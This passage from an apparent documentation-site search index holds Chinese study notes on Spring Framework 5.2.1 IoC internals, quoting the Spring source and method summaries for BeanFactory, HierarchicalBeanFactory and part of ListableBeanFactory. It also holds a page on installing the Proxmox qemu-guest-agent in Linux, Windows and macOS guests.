<li>Spring\u200b\u6e90\u7801\u200b\u6df1\u5ea6\u200b\u89e3\u6790\u200b\uff08\u200b\u7b2c\u4e8c\u200b\u7248\u200b\uff09 \u200b\u90dd\u4f73\u200b</li> <li>Spring5\u200b\u4f01\u4e1a\u7ea7\u200b\u5f00\u53d1\u200b\u5b9e\u6218\u200b \u200b\u5468\u200b\u51a0\u4e9a\u200b \u200b\u9ec4\u6587\u6bc5\u200b \u200b\u914d\u5957\u200b\u6e90\u7801\u200b</li> <li>Gitee\u200b\u540c\u6b65\u200b\u7248\u672c\u200b\uff1ahttps://gitee.com/ACANX/spring5projectdemo</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/5/","title":"Spring-IoC\u200b\u542f\u52a8\u200b\u6d41\u7a0b\u200b\u5206\u6790","text":""},{"location":"2/5/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":"<p>Guest Agent \u200b\u662f\u200b\u5b89\u88c5\u200b\u5728\u200b VM \u200b\u865a\u62df\u673a\u200b\u91cc\u9762\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5e2e\u52a9\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5728\u200b PVE \u200b\u91cc\u9762\u200b\u4e3b\u8981\u200b\u8d77\u5230\u200b\u4e0b\u9762\u200b\u4e09\u4e2a\u200b\u4f5c\u7528\u200b\uff1a</p> <ol> <li>\u200b\u4f7f\u7528\u200b\u6b63\u5e38\u200b\u65b9\u6cd5\u200b\u5173\u95ed\u200b VM\uff0c\u200b\u8fd8\u200b\u4e0d\u662f\u200b\u4f9d\u8d56\u4e8e\u200b ACPI \u200b\u547d\u4ee4\u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u7a97\u53e3\u200b\u7b56\u7565\u200b</li> <li>\u200b\u663e\u793a\u200b VM \u200b\u7684\u200b IP  \u200b\u5730\u5740\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u7528\u6237\u200b\u7684\u200b\u4f7f\u7528\u200b\u4f53\u9a8c\u200b</li> <li>\u200b\u5728\u200b\u8fdb\u884c\u200b\u5907\u4efd\u200b\u7684\u200b\u65f6\u5019\u200b\u51bb\u7ed3\u200b VM \u200b\u4e0a\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7cfb\u5217\u200b</li> </ol> Guest Agen \u200b\u672a\u200b\u5b89\u88c5\u200bGuest Agen \u200b\u5df2\u200b\u5b89\u88c5\u200b <p> </p> <p></p>"},{"location":"2/5/#agent","title":"\u5b89\u88c5\u200b Agent","text":""},{"location":"2/5/#linux","title":"Linux","text":"<p>\u200b\u5728\u200b\u57fa\u4e8e\u200b Debian/Ubuntu \u200b\u7684\u200b\u7cfb\u7edf\u200b\uff1a</p> Bash<pre><code>apt install qemu-guest-agent\n</code></pre> <p>\u200b\u5728\u200b\u57fa\u4e8e\u200b Redhat \u200b\u7684\u200b\u7cfb\u7edf\u200b\uff1a</p> Bash<pre><code>yum install qemu-guest-agent\n</code></pre> <p>qemu-guest-agent \u200b\u9ed8\u8ba4\u200b\u4e3a\u200b\u5f00\u542f\u200b\u81ea\u542f\u200b\u7684\u200b\uff0c\u200b\u91cd\u542f\u200b VM \u200b\u5373\u53ef\u200b\u770b\u5230\u200b\u6548\u679c\u200b\u3002</p>"},{"location":"2/5/#windows","title":"Windows","text":"<p>Windows \u200b\u4e0b\u200b\u9700\u8981\u200b\u63a5\u200b\u4f4f\u200b VirtIO \u200b\u9a71\u52a8\u200b\uff0c\u200b\u6700\u65b0\u200b\u7a33\u5b9a\u200b\u7248\u672c\u200b\u7684\u200b\u4e0b\u8f7d\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1a</p> <p>https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso</p> <p>\u200b\u7136\u540e\u200b\u5c06\u200b iso \u200b\u955c\u50cf\u200b\u6dfb\u52a0\u200b\u5230\u200b VM \u200b\u4e2d\u200b\uff0c\u200b\u6253\u5f00\u200b virtio-win-guest-tools.exe \u200b\u5373\u53ef\u200b\u81ea\u52a8\u200b\u5b89\u88c5\u200b\u6240\u6709\u200b\u76f8\u5173\u200b\u7684\u200b\u5de5\u5177\u200b\uff1a</p> <p> </p>"},{"location":"2/5/#macos","title":"macOS","text":"<p>\u200b\u7ecf\u8fc7\u200b\u56fd\u5149\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53c2\u8003\u200b\u6211\u200b\u7684\u200b\u9ed1\u200b\u82f9\u679c\u200b\u7ae0\u8282\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b Guest Agent \u200b\u662f\u200b\u9ed8\u8ba4\u200b\u5b89\u88c5\u200b\u597d\u200b\u7684\u200b\uff0c\u200b\u6709\u56fe\u200b\u6709\u200b\u771f\u76f8\u200b\uff1a</p> <p> </p>"},{"location":"2/5/#_2","title":"\u53c2\u8003\u200b\u94fe\u63a5","text":"<ul> <li>PVE \u200b\u5b98\u65b9\u200b Qemu-guest-agent</li> </ul>"},{"location":"2/6/","title":"Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#1","title":"1.\u200b\u51e0\u4e2a\u200b\u91cd\u8981\u200b\u7c7b\u200b/\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_1","title":"\u9605\u8bfb\u200b\u524d\u200b\u7684\u200b\u51c6\u5907","text":"<ul> <li>\u200b\u6e90\u7801\u200b\u4e0b\u8f7d\u200b\uff1a<ul> <li>https://github.com/spring-projects/spring-framework  </li> <li>https://github.com/spring-projects/spring-framework.git</li> </ul> </li> <li>\u200b\u6e90\u7801\u200b\u7248\u672c\u200b\uff1av5.2.1.RELEASE</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#11-beanfactory-ioc","title":"1.1 BeanFactory \u200b\u9876\u7ea7\u200b\u63a5\u53e3\u200b\uff08\u200b\u4f4e\u914d\u200b\u7248\u200b\u7684\u200bIoC\u200b\u5bb9\u5668\u200b\uff09","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#beanfactory","title":"BeanFactory\u200b\u63a5\u53e3\u5b9a\u4e49\u200b\u8bf4\u660e","text":"<ul> <li>BeanFactory\u200b\u662f\u200b\u4f4e\u200b\u914d\u7248\u200b\u7684\u200bIoC\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5b9a\u4e49\u200b\u4e86\u200bIoc\u200b\u5bb9\u5668\u200b\u57fa\u672c\u200b\u7684\u200b\u529f\u80fd\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_2","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.core.ResolvableType;\nimport org.springframework.lang.Nullable;\n\n/**\n * The root interface for accessing a Spring bean container.\n * This is the basic client view of a bean container;\n * further interfaces such as {@link ListableBeanFactory} and\n * {@link org.springframework.beans.factory.config.ConfigurableBeanFactory}\n * are available for specific purposes.\n *\n * &lt;p&gt;This interface is implemented by objects that hold a number of bean definitions,\n * each uniquely identified by a String name. Depending on the bean definition,\n * the factory will return either an independent instance of a contained object\n * (the Prototype design pattern), or a single shared instance (a superior\n * alternative to the Singleton design pattern, in which the instance is a\n * singleton in the scope of the factory). Which type of instance will be returned\n * depends on the bean factory configuration: the API is the same. Since Spring\n * 2.0, further scopes are available depending on the concrete application\n * context (e.g. \"request\" and \"session\" scopes in a web environment).\n *\n * &lt;p&gt;The point of this approach is that the BeanFactory is a central registry\n * of application components, and centralizes configuration of application\n * components (no more do individual objects need to read properties files,\n * for example). See chapters 4 and 11 of \"Expert One-on-One J2EE Design and\n * Development\" for a discussion of the benefits of this approach.\n *\n * &lt;p&gt;Note that it is generally better to rely on Dependency Injection\n * (\"push\" configuration) to configure application objects through setters\n * or constructors, rather than use any form of \"pull\" configuration like a\n * BeanFactory lookup. Spring's Dependency Injection functionality is\n * implemented using this BeanFactory interface and its subinterfaces.\n *\n * &lt;p&gt;Normally a BeanFactory will load bean definitions stored in a configuration\n * source (such as an XML document), and use the {@code org.springframework.beans}\n * package to configure the beans. However, an implementation could simply return\n * Java objects it creates as necessary directly in Java code. There are no\n * constraints on how the definitions could be stored: LDAP, RDBMS, XML,\n * properties file, etc. Implementations are encouraged to support references\n * amongst beans (Dependency Injection).\n *\n * &lt;p&gt;In contrast to the methods in {@link ListableBeanFactory}, all of the\n * operations in this interface will also check parent factories if this is a\n * {@link HierarchicalBeanFactory}. If a bean is not found in this factory instance,\n * the immediate parent factory will be asked. Beans in this factory instance\n * are supposed to override beans of the same name in any parent factory.\n *\n * &lt;p&gt;Bean factory implementations should support the standard bean lifecycle interfaces\n * as far as possible. The full set of initialization methods and their standard order is:\n * &lt;ol&gt;\n * &lt;li&gt;BeanNameAware's {@code setBeanName}\n * &lt;li&gt;BeanClassLoaderAware's {@code setBeanClassLoader}\n * &lt;li&gt;BeanFactoryAware's {@code setBeanFactory}\n * &lt;li&gt;EnvironmentAware's {@code setEnvironment}\n * &lt;li&gt;EmbeddedValueResolverAware's {@code setEmbeddedValueResolver}\n * &lt;li&gt;ResourceLoaderAware's {@code setResourceLoader}\n * (only applicable when running in an application context)\n * &lt;li&gt;ApplicationEventPublisherAware's {@code setApplicationEventPublisher}\n * (only applicable when running in an application context)\n * &lt;li&gt;MessageSourceAware's {@code setMessageSource}\n * (only applicable when running in an application context)\n * &lt;li&gt;ApplicationContextAware's {@code setApplicationContext}\n * (only applicable when running in an application context)\n * &lt;li&gt;ServletContextAware's {@code setServletContext}\n * (only applicable when running in a web application context)\n * &lt;li&gt;{@code postProcessBeforeInitialization} methods of BeanPostProcessors\n * &lt;li&gt;InitializingBean's {@code afterPropertiesSet}\n * &lt;li&gt;a custom init-method definition\n * &lt;li&gt;{@code postProcessAfterInitialization} methods of BeanPostProcessors\n * &lt;/ol&gt;\n *\n * &lt;p&gt;On shutdown of a bean factory, the following lifecycle methods apply:\n * &lt;ol&gt;\n * &lt;li&gt;{@code postProcessBeforeDestruction} methods of DestructionAwareBeanPostProcessors\n * &lt;li&gt;DisposableBean's {@code destroy}\n * &lt;li&gt;a custom destroy-method definition\n * &lt;/ol&gt;\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @author Chris Beams\n * @since 13 April 2001\n * @see BeanNameAware#setBeanName\n * @see BeanClassLoaderAware#setBeanClassLoader\n * @see BeanFactoryAware#setBeanFactory\n * @see org.springframework.context.ResourceLoaderAware#setResourceLoader\n * @see org.springframework.context.ApplicationEventPublisherAware#setApplicationEventPublisher\n * @see org.springframework.context.MessageSourceAware#setMessageSource\n * @see org.springframework.context.ApplicationContextAware#setApplicationContext\n * @see org.springframework.web.context.ServletContextAware#setServletContext\n * @see org.springframework.beans.factory.config.BeanPostProcessor#postProcessBeforeInitialization\n * @see InitializingBean#afterPropertiesSet\n * @see org.springframework.beans.factory.support.RootBeanDefinition#getInitMethodName\n * @see org.springframework.beans.factory.config.BeanPostProcessor#postProcessAfterInitialization\n * @see DisposableBean#destroy\n * @see org.springframework.beans.factory.support.RootBeanDefinition#getDestroyMethodName\n */\npublic interface BeanFactory {\n\n    /**\n     * Used to dereference a {@link FactoryBean} instance and distinguish it from\n     * beans &lt;i&gt;created&lt;/i&gt; by the FactoryBean. For example, if the bean named\n     * {@code myJndiObject} is a FactoryBean, getting {@code &amp;myJndiObject}\n     * will return the factory, not the instance returned by the factory.\n     */\n    String FACTORY_BEAN_PREFIX = \"&amp;\";\n\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;This method allows a Spring BeanFactory to be used as a replacement for the\n     * Singleton or Prototype design pattern. Callers may retain references to\n     * returned objects in the case of Singleton beans.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to retrieve\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no bean with the specified name\n     * @throws BeansException if the bean could not be obtained\n     */\n    Object getBean(String name) throws BeansException;\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;Behaves the same as {@link #getBean(String)}, but provides a measure of type\n     * safety by throwing a BeanNotOfRequiredTypeException if the bean is not of the\n     * required type. This means that ClassCastException can't be thrown on casting\n     * the result correctly, as can happen with {@link #getBean(String)}.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to retrieve\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no such bean definition\n     * @throws BeanNotOfRequiredTypeException if the bean is not of the required type\n     * @throws BeansException if the bean could not be created\n     */\n    &lt;T&gt; T getBean(String name, Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;Allows for specifying explicit constructor arguments / factory method arguments,\n     * overriding the specified default arguments (if any) in the bean definition.\n     * @param name the name of the bean to retrieve\n     * @param args arguments to use when creating a bean instance using explicit arguments\n     * (only applied when creating a new instance as opposed to retrieving an existing one)\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no such bean definition\n     * @throws BeanDefinitionStoreException if arguments have been given but\n     * the affected bean isn't a prototype\n     * @throws BeansException if the bean could not be created\n     * @since 2.5\n     */\n    Object getBean(String name, Object... args) throws BeansException;\n\n    /**\n     * Return the bean instance that uniquely matches the given object type, if any.\n     * &lt;p&gt;This method goes into {@link ListableBeanFactory} by-type lookup territory\n     * but may also be translated into a conventional by-name lookup based on the name\n     * of the given type. For more extensive retrieval operations across sets of beans,\n     * use {@link ListableBeanFactory} and/or {@link BeanFactoryUtils}.\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @return an instance of the single bean matching the required type\n     * @throws NoSuchBeanDefinitionException if no bean of the given type was found\n     * @throws NoUniqueBeanDefinitionException if more than one bean of the given type was found\n     * @throws BeansException if the bean could not be created\n     * @since 3.0\n     * @see ListableBeanFactory\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;Allows for specifying explicit constructor arguments / factory method arguments,\n     * overriding the specified default arguments (if any) in the bean definition.\n     * &lt;p&gt;This method goes into {@link ListableBeanFactory} by-type lookup territory\n     * but may also be translated into a conventional by-name lookup based on the name\n     * of the given type. For more extensive retrieval operations across sets of beans,\n     * use {@link ListableBeanFactory} and/or {@link BeanFactoryUtils}.\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @param args arguments to use when creating a bean instance using explicit arguments\n     * (only applied when creating a new instance as opposed to retrieving an existing one)\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no such bean definition\n     * @throws BeanDefinitionStoreException if arguments have been given but\n     * the affected bean isn't a prototype\n     * @throws BeansException if the bean could not be created\n     * @since 4.1\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType, Object... args) throws BeansException;\n\n    /**\n     * Return a provider for the specified bean, allowing for lazy on-demand retrieval\n     * of instances, including availability and uniqueness options.\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @return a corresponding provider handle\n     * @since 5.1\n     * @see #getBeanProvider(ResolvableType)\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(Class&lt;T&gt; requiredType);\n\n    /**\n     * Return a provider for the specified bean, allowing for lazy on-demand retrieval\n     * of instances, including availability and uniqueness options.\n     * @param requiredType type the bean must match; can be a generic type declaration.\n     * Note that collection types are not supported here, in contrast to reflective\n     * injection points. For programmatically retrieving a list of beans matching a\n     * specific type, specify the actual bean type as an argument here and subsequently\n     * use {@link ObjectProvider#orderedStream()} or its lazy streaming/iteration options.\n     * @return a corresponding provider handle\n     * @since 5.1\n     * @see ObjectProvider#iterator()\n     * @see ObjectProvider#stream()\n     * @see ObjectProvider#orderedStream()\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(ResolvableType requiredType);\n\n    /**\n     * Does this bean factory contain a bean definition or externally registered singleton\n     * instance with the given name?\n     * &lt;p&gt;If the given name is an alias, it will be translated back to the corresponding\n     * canonical bean name.\n     * &lt;p&gt;If this factory is hierarchical, will ask any parent factory if the bean cannot\n     * be found in this factory instance.\n     * &lt;p&gt;If a bean definition or singleton instance matching the given name is found,\n     * this method will return {@code true} whether the named bean definition is concrete\n     * or abstract, lazy or eager, in scope or not. Therefore, note that a {@code true}\n     * return value from this method does not necessarily indicate that {@link #getBean}\n     * will be able to obtain an instance for the same name.\n     * @param name the name of the bean to query\n     * @return whether a bean with the given name is present\n     */\n    boolean containsBean(String name);\n\n    /**\n     * Is this bean a shared singleton? That is, will {@link #getBean} always\n     * return the same instance?\n     * &lt;p&gt;Note: This method returning {@code false} does not clearly indicate\n     * independent instances. It indicates non-singleton instances, which may correspond\n     * to a scoped bean as well. Use the {@link #isPrototype} operation to explicitly\n     * check for independent instances.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @return whether this bean corresponds to a singleton instance\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @see #getBean\n     * @see #isPrototype\n     */\n    boolean isSingleton(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Is this bean a prototype? That is, will {@link #getBean} always return\n     * independent instances?\n     * &lt;p&gt;Note: This method returning {@code false} does not clearly indicate\n     * a singleton object. It indicates non-independent instances, which may correspond\n     * to a scoped bean as well. Use the {@link #isSingleton} operation to explicitly\n     * check for a shared singleton instance.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @return whether this bean will always deliver independent instances\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 2.0.3\n     * @see #getBean\n     * @see #isSingleton\n     */\n    boolean isPrototype(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Check whether the bean with the given name matches the specified type.\n     * More specifically, check whether a {@link #getBean} call for the given name\n     * would return an object that is assignable to the specified target type.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @param typeToMatch the type to match against (as a {@code ResolvableType})\n     * @return {@code true} if the bean type matches,\n     * {@code false} if it doesn't match or cannot be determined yet\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 4.2\n     * @see #getBean\n     * @see #getType\n     */\n    boolean isTypeMatch(String name, ResolvableType typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Check whether the bean with the given name matches the specified type.\n     * More specifically, check whether a {@link #getBean} call for the given name\n     * would return an object that is assignable to the specified target type.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @param typeToMatch the type to match against (as a {@code Class})\n     * @return {@code true} if the bean type matches,\n     * {@code false} if it doesn't match or cannot be determined yet\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 2.0.1\n     * @see #getBean\n     * @see #getType\n     */\n    boolean isTypeMatch(String name, Class&lt;?&gt; typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Determine the type of the bean with the given name. More specifically,\n     * determine the type of object that {@link #getBean} would return for the given name.\n     * &lt;p&gt;For a {@link FactoryBean}, return the type of object that the FactoryBean creates,\n     * as exposed by {@link FactoryBean#getObjectType()}. This may lead to the initialization\n     * of a previously uninitialized {@code FactoryBean} (see {@link #getType(String, boolean)}).\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @return the type of the bean, or {@code null} if not determinable\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 1.1.2\n     * @see #getBean\n     * @see #isTypeMatch\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Determine the type of the bean with the given name. More specifically,\n     * determine the type of object that {@link #getBean} would return for the given name.\n     * &lt;p&gt;For a {@link FactoryBean}, return the type of object that the FactoryBean creates,\n     * as exposed by {@link FactoryBean#getObjectType()}. Depending on the\n     * {@code allowFactoryBeanInit} flag, this may lead to the initialization of a previously\n     * uninitialized {@code FactoryBean} if no early type information is available.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @param allowFactoryBeanInit whether a {@code FactoryBean} may get initialized\n     * just for the purpose of determining its object type\n     * @return the type of the bean, or {@code null} if not determinable\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 5.2\n     * @see #getBean\n     * @see #isTypeMatch\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name, boolean allowFactoryBeanInit) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Return the aliases for the given bean name, if any.\n     * All of those aliases point to the same bean when used in a {@link #getBean} call.\n     * &lt;p&gt;If the given name is an alias, the corresponding original bean name\n     * and other aliases (if any) will be returned, with the original bean name\n     * being the first element in the array.\n     * &lt;p&gt;Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the bean name to check for aliases\n     * @return the aliases, or an empty array if none\n     * @see #getBean\n     */\n    String[] getAliases(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#beanfactory_1","title":"BeanFactory\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface BeanFactory {\n\n    /**\n     */\n    String FACTORY_BEAN_PREFIX = \"&amp;\";\n\n\n    /**\n     */\n    Object getBean(String name) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; T getBean(String name, Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     */\n    Object getBean(String name, Object... args) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType, Object... args) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(Class&lt;T&gt; requiredType);\n\n    /**\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(ResolvableType requiredType);\n\n    /**\n     */\n    boolean containsBean(String name);\n\n    /**\n     */\n    boolean isSingleton(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    boolean isPrototype(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    boolean isTypeMatch(String name, ResolvableType typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    boolean isTypeMatch(String name, Class&lt;?&gt; typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name, boolean allowFactoryBeanInit) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    String[] getAliases(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#12-hierarchicalbeanfactory","title":"1.2 HierarchicalBeanFactory\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_3","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2012 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory;\n\nimport org.springframework.lang.Nullable;\n\n/**\n * Sub-interface implemented by bean factories that can be part\n * of a hierarchy.\n *\n * &lt;p&gt;The corresponding {@code setParentBeanFactory} method for bean\n * factories that allow setting the parent in a configurable\n * fashion can be found in the ConfigurableBeanFactory interface.\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @since 07.07.2003\n * @see org.springframework.beans.factory.config.ConfigurableBeanFactory#setParentBeanFactory\n */\npublic interface HierarchicalBeanFactory extends BeanFactory {\n\n    /**\n     * Return the parent bean factory, or {@code null} if there is none.\n     */\n    @Nullable\n    BeanFactory getParentBeanFactory();\n\n    /**\n     * Return whether the local bean factory contains a bean of the given name,\n     * ignoring beans defined in ancestor contexts.\n     * &lt;p&gt;This is an alternative to {@code containsBean}, ignoring a bean\n     * of the given name from an ancestor bean factory.\n     * @param name the name of the bean to query\n     * @return whether a bean with the given name is defined in the local factory\n     * @see BeanFactory#containsBean\n     */\n    boolean containsLocalBean(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#hierarchicalbeanfactory","title":"HierarchicalBeanFactory\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface HierarchicalBeanFactory extends BeanFactory {\n\n    /**\n     */\n    @Nullable\n    BeanFactory getParentBeanFactory();\n\n    /**\n     */\n    boolean containsLocalBean(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#13-listablebeanfactory","title":"1.3 ListableBeanFactory\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_4","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory;\n\nimport java.lang.annotation.Annotation;\nimport java.util.Map;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.core.ResolvableType;\nimport org.springframework.lang.Nullable;\n\n/**\n * Extension of the {@link BeanFactory} interface to be implemented by bean factories\n * that can enumerate all their bean instances, rather than attempting bean lookup\n * by name one by one as requested by clients. BeanFactory implementations that\n * preload all their bean definitions (such as XML-based factories) may implement\n * this interface.\n *\n * &lt;p&gt;If this is a {@link HierarchicalBeanFactory}, the return values will &lt;i&gt;not&lt;/i&gt;\n * take any BeanFactory hierarchy into account, but will relate only to the beans\n * defined in the current factory. Use the {@link BeanFactoryUtils} helper class\n * to consider beans in ancestor factories too.\n *\n * &lt;p&gt;The methods in this interface will just respect bean definitions of this factory.\n * They will ignore any singleton beans that have been registered by other means like\n * {@link org.springframework.beans.factory.config.ConfigurableBeanFactory}'s\n * {@code registerSingleton} method, with the exception of\n * {@code getBeanNamesOfType} and {@code getBeansOfType} which will check\n * such manually registered singletons too. Of course, BeanFactory's {@code getBean}\n * does allow transparent access to such special beans as well. However, in typical\n * scenarios, all beans will be defined by external bean definitions anyway, so most\n * applications don't need to worry about this differentiation.\n *\n * &lt;p&gt;&lt;b&gt;NOTE:&lt;/b&gt; With the exception of {@code getBeanDefinitionCount}\n * and {@code containsBeanDefinition}, the methods in this interface\n * are not designed for frequent invocation. Implementations may be slow.\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @since 16 April 2001\n * @see HierarchicalBeanFactory\n * @see BeanFactoryUtils\n */\npublic interface ListableBeanFactory extends BeanFactory {\n\n    /**\n     * Check if this bean factory contains a bean definition with the given name.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in,\n     * and ignores any singleton beans that have been registered by\n     * other means than bean definitions.\n     * @param beanName the name of the bean to look for\n     * @return if this bean factory contains a bean definition with the given name\n     * @see #containsBean\n     */\n    boolean containsBeanDefinition(String beanName);\n\n    /**\n     * Return the number of beans defined in the factory.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in,\n     * and ignores any singleton beans that have been registered by\n     * other means than bean definitions.\n     * @return the number of beans defined in the factory\n     */\n    int getBeanDefinitionCount();\n\n    /**\n     * Return the names of all beans defined in this factory.\n     * &lt;p&gt;Does not consider any 